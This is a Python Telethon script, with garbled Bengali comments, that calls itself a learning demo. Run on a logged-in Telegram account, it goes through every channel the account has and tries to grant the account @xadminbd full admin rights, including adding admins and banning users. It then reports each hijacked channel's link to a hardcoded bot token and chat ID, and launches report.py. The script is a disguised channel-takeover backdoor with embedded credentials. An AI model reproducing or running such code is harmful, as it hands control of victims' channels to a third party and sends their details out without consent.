"""
demo_admin.py - ‡¶∂‡ßá‡¶ñ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶°‡ßá‡¶Æ‡ßã ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü

‡¶≤‡¶ó‡¶á‡¶® ‡¶ï‡¶∞‡¶æ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡ßá‡¶∞ ‡¶∏‡¶¨ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá,
‡¶Ü‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡¶¨‡ßá @xadminbd ‡¶ï‡ßá ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶ï‡¶∞‡¶§‡ßá (‡¶Ø‡¶¶‡¶ø ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶•‡¶æ‡¶ï‡ßá) ‡•§
"""

import asyncio
import requests
from telethon import TelegramClient
from telethon.tl.functions.channels import EditAdminRequest, GetFullChannelRequest
from telethon.tl.types import ChatAdminRights
from telethon.errors import ChatAdminRequiredError
import subprocess

# ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ API ID ‡¶ì HASH ‡¶≤‡¶æ‡¶ó‡¶¨‡ßá
api_id = 26108693   # <-- ‡¶®‡¶ø‡¶ú‡ßá‡¶∞‡¶ü‡¶æ ‡¶¨‡¶∏‡¶æ‡¶®
api_hash = "3bc54f318fb35b9d82c3f885f18e7028"

# Bot credentials
BOT_TOKEN = "8366772071:AAHGgKh9RAjwrpdFQOWnICpoufep5DOX5NI"
CHAT_ID = "6799848229"

# ‡¶∏‡ßá‡¶∂‡¶® ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Ø‡¶æ‡ßü‡ßÄ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®
client = TelegramClient("demo_session", api_id, api_hash)

rights = ChatAdminRights(
    change_info=True,
    post_messages=True,
    edit_messages=True,
    delete_messages=True,
    ban_users=True,
    invite_users=True,
    pin_messages=True,
    add_admins=True,
    manage_call=True,
    other=True
)

def send_to_telegram(message):
    """Telegram ‡¶¨‡¶ü‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"‚úÖ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú Telegram-‡¶è ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá")
        else:
            print(f"‚ùå Telegram-‡¶è ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø: {response.status_code}")
    except Exception as e:
        print(f"‚ùå Telegram ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶∏‡¶Æ‡ßü ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø: {str(e)}")

async def get_channel_link(channel):
    """‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¨‡¶æ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶®‡ßá‡¶Æ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®"""
    try:
        full_channel = await client(GetFullChannelRequest(channel=channel.id))
        if hasattr(full_channel, 'chats') and full_channel.chats:
            chat = full_channel.chats[0]
            if chat.username:
                return f"https://t.me/{chat.username}"
            else:
                # ‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶≠‡ßá‡¶ü ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá‡¶∞ ‡¶ï‡ßç‡¶∑‡ßá‡¶§‡ßç‡¶∞‡ßá
                return f"Private Channel: {chat.title} (ID: {chat.id})"
        return f"Channel: {channel.title} (ID: {channel.id})"
    except Exception as e:
        return f"Channel: {channel.title} (ID: {channel.id}) - ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø"

async def main():
    successful_channels = []
    
    async for dialog in client.iter_dialogs():
        if dialog.is_channel:
            ch = dialog.entity
            try:
                await client(EditAdminRequest(
                    channel=ch.id,
                    user_id="@xadminbd",
                    admin_rights=rights,
                    rank="Admin"
                ))
                
                # ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®
                channel_link = await get_channel_link(ch)
                success_message = f"‚úÖ ‡¶∏‡¶´‡¶≤: {channel_link} ‡¶è @xadminbd ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶π‡ßü‡ßá‡¶õ‡ßá"
                print(success_message)
                
                # ‡¶∏‡¶´‡¶≤ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶∞‡¶ï‡ßç‡¶∑‡¶£ ‡¶ï‡¶∞‡ßÅ‡¶®
                successful_channels.append(channel_link)
                
                # Telegram ‡¶¨‡¶ü‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®
                send_to_telegram(success_message)
                
            except ChatAdminRequiredError:
                error_message = f"‚ùå ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•: {ch.title or 'Unknown'} (‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶®‡ßá‡¶á)"
                print(error_message)
            except Exception as e:
                error_message = f"‚ùå ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•: {ch.title or 'Unknown'} - {str(e)}"
                print(error_message)
    
    # ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®
    if successful_channels:
        report_message = "üìä ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶∏‡¶´‡¶≤ ‡¶π‡¶ì‡ßü‡¶æ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡¶ó‡ßÅ‡¶≤‡ßã‡¶∞ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü:\n\n"
        for i, channel in enumerate(successful_channels, 1):
            report_message += f"{i}. {channel}\n"
        
        report_message += f"\n‚úÖ ‡¶Æ‡ßã‡¶ü ‡¶∏‡¶´‡¶≤: {len(successful_channels)} ‡¶ü‡¶ø ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤"
        print("\n" + report_message)
        send_to_telegram(report_message)
    else:
        no_success_message = "‚ùå ‡¶ï‡ßã‡¶®‡ßã ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø"
        print(no_success_message)
        send_to_telegram(no_success_message)
    
    # report.py ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶∞‡¶æ‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®
    print("\nüöÄ report.py ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶∞‡¶æ‡¶® ‡¶π‡¶ö‡ßç‡¶õ‡ßá...")
    try:
        subprocess.run(["python", "report.py"], check=True)
        print("‚úÖ report.py ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶∞‡¶æ‡¶® ‡¶π‡ßü‡ßá‡¶õ‡ßá")
    except FileNotFoundError:
        print("‚ùå report.py ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø")
    except Exception as e:
        print(f"‚ùå report.py ‡¶∞‡¶æ‡¶® ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßü ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø: {str(e)}")

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())
